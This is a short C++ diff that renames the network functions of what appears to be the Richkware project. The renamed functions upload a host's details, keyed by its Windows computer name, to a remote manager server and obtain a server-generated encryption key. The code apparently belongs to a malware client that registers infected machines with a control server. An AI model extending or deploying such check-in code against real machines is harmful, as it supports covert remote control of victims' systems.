@@ -132,7 +132,7 @@ std::string Network::RawRequest(const char* serverAddress, const char* port,	con
 }
 
 
-bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, const char* port) {
+bool Network::UploadInfoToRMS(const char * serverAddress, const char* port) {
     const char* serverPort = server.getPort();
     Crypto crypto(encryptionKey);
 
@@ -152,12 +152,12 @@ bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, con
     return true;
 }
 
-std::string Network::KeyExchange(const char * serverAddress, const char* port){
+std::string Network::GetEncryptionKeyFromRMS(const char * serverAddress, const char* port){
     Crypto crypto(encryptionKey);
     std::string key = "";
 
     // create a database entry into the Richkware-Manager-Server, to obtain the encryption key server-side generated
-    UploadInfoToRichkwareManagerServer(serverAddress,port);
+    UploadInfoToRMS(serverAddress,port);
 
     // Primary key in RMS database.
     std::string name = getenv("COMPUTERNAME");
